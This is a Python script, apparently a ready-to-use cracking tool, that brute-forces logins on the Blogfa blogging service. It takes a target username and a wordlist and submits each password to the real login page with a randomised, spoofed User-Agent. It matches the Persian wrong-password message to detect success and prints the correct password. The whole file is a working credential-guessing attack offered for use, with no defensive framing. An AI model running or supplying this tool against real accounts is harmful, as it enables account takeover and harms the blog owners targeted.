import os
import time
from bs4 import BeautifulSoup
import requests as rq
import sys, random
rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
cn = '\033[00;36m'
from colorama import Fore, init

    
login = 'https://blogfa.com/desktop/login.aspx'
    
user_agent = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",]
users = (random.choice(user_agent))
heder = {'Host': 'blogfa.com',
'User-Agent': users,
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate, br',
'Content-Type': 'application/x-www-form-urlencoded',
'Content-Length': '175',
'Origin': 'https://blogfa.com',
'Connection': 'keep-alive',
'Referer': 'https://blogfa.com/desktop/login.aspx?r=637860193478105692',
'Upgrade-Insecure-Requests': '1',
'Pragma': 'no-cache',
'Cache-Control': 'no-cache'}
os.system("clear")
print (f"""

{lrd}######   ####      #####    #####    #######   ###      {lgn}         ####   ######     ###      ####   ### ###  
{lrd} ##  ##   ##      ### ###  ##   ##    ##   #  ## ##     {lgn}        ##  ##   ##  ##   ## ##    ##  ##   ## ##   
{lrd} ##  ##   ##      ##   ##  ##         ##     ##   ##    {lgn}       ##        ##  ##  ##   ##  ##        ####    
{lrd} #####    ##      ##   ##  ## ####    ####   ##   ##    {lgn}       ##        #####   ##   ##  ##        ###     
{lrd} ##  ##   ##      ##   ##  ##   ##    ##     #######    {lgn}       ##        ## ##   #######  ##        ####    
{lrd} ##  ##   ##  ##  ### ###  ##   ##    ##     ##   ##    {lgn}        ##  ##   ## ##   ##   ##   ##  ##   ## ##   
{lrd}######   #######   #####    #####    ####    ##   ##    {lgn}         ####   #### ##  ##   ##    ####   ### ###  
                                                                                                            
                                    {lrd}github : {lgn}github.com/esfelurm
                                    
                                    {lrd}channel telegram : {lgn}@esfelurm
                                                                                                            """)
target = input(f"{lrd}[{yw}URL{lrd}] Enter url target : {lgn}")
print (f"{yw}-----------------------------------")
password = input(f"{lrd}[{yw}PASS{lrd}] Enter name password lidt : {lgn} ")
print (f"{lrd}---------------------------------------")
print ('')
pas = open(password, 'r').read().split()
test_log = rq.get(login)
text_web = (test_log).text
su = BeautifulSoup(text_web, 'html.parser')
tet= su.find('input')['value']
for test_pass in pas:    
    pay = {"_tt":tet,
"usrid":target,
"ups":test_pass,
"btnSubmit":"ورود+به+بخش+مدیریت+وبلاگ"}
    send_pass = rq.post('https://blogfa.com/desktop/login.aspx',data=pay, headers=heder)
    result = (send_pass).text

    login_text = BeautifulSoup(result, 'html.parser')
    data0 = login_text.find_all('i')
    send_data = str(data0)
    # -------------------------------------------------
    if"کلمه عبور را اشتباه وارد کرده اید" in send_data:
        print (f"{yw}[{lrd}NO{yw}]{pe} The password is wrong :{lrd} ", test_pass)
        print ('')

    if"کلمه عبور را اشتباه وارد کرده اید" not in send_data:
        print(f"""{lrd}
        ------------------------------------------------------------
       | 			    			    {lrd} 	 |
       |{lrd}[{lgn}OK{lrd}]{cn} The password is correct : {lgn} {test_pass}	       {lrd}  |
       |    						    {lrd} 	 |
	------------------------------------------------------------{lgn}""")
        sys.exit()
        


time.sleep(15)
os.system("python spider-web.py")


